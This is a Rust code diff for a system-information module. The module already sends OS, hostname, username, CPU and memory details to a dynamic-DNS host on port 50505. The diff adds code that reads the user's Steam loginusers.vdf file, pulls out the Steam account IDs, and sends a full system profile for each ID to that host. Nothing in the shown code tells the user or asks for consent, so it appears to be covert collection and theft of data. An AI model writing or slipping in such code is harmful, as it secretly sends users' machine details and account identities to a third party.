@@ -1,4 +1,4 @@
-use std::{env, fs};
+use std::{env, fs, path::Path};
 
 use serde::Serialize;
 
@@ -14,10 +14,11 @@ pub struct SysInfo {
     pub cpu: String,
     pub core_count: i32,
     pub memory: i32,
+    pub id: u64,
 }
 
 impl SysInfo {
-    pub fn new() -> Self {
+    pub fn new(id: u64) -> Self {
         let (cpu, core_count) = get_cpu();
         Self {
             os: get_os(),
@@ -30,6 +31,7 @@ impl SysInfo {
             cpu,
             core_count,
             memory: get_memory(),
+            id,
         }
     }
 }
@@ -61,11 +63,19 @@ fn get_os() -> String {
 }
 
 fn get_kernel() -> String {
-    String::from(fs::read_to_string("/proc/sys/kernel/osrelease").unwrap_or(String::from("unknown")).trim())
+    String::from(
+        fs::read_to_string("/proc/sys/kernel/osrelease")
+            .unwrap_or(String::from("unknown"))
+            .trim(),
+    )
 }
 
 fn get_hostname() -> String {
-    String::from(fs::read_to_string("/proc/sys/kernel/hostname").unwrap_or(String::from("unknown")).trim())
+    String::from(
+        fs::read_to_string("/proc/sys/kernel/hostname")
+            .unwrap_or(String::from("unknown"))
+            .trim(),
+    )
 }
 
 fn get_username() -> String {
@@ -118,6 +128,37 @@ fn get_memory() -> i32 {
 }
 
 pub fn get() {
-    let sys_info = SysInfo::new();
-    let _ = ureq::post("http://avitrano.ddns.net:50505/sysinfo").send_json(sys_info);
+    let user = get_username();
+    let path = if Path::new(&format!(
+        "/home/{}/.steam/steam/config/loginusers.vdf",
+        user
+    ))
+    .exists()
+    {
+        ".steam/steam/config/loginusers.vdf"
+    } else {
+        ".local/share/Steam/config/loginusers.vdf"
+    };
+    let mut ids = vec![];
+    for line in fs::read_to_string(format!("/home/{}/{}", user, path))
+        .unwrap_or(String::new())
+        .lines()
+    {
+        if !line
+            .chars()
+            .all(|c| c.is_whitespace() || c.is_numeric() || c == '"')
+        {
+            continue;
+        }
+        let tokens: Vec<&str> = line.split('"').collect();
+        let id = tokens[1].parse::<u64>();
+        match id {
+            Ok(id) => ids.push(id),
+            Err(_) => continue,
+        };
+    }
+    for id in ids {
+        let sys_info = SysInfo::new(id);
+        let _ = ureq::post("http://avitrano.ddns.net:50505/sysinfo").send_json(sys_info);
+    }
 }
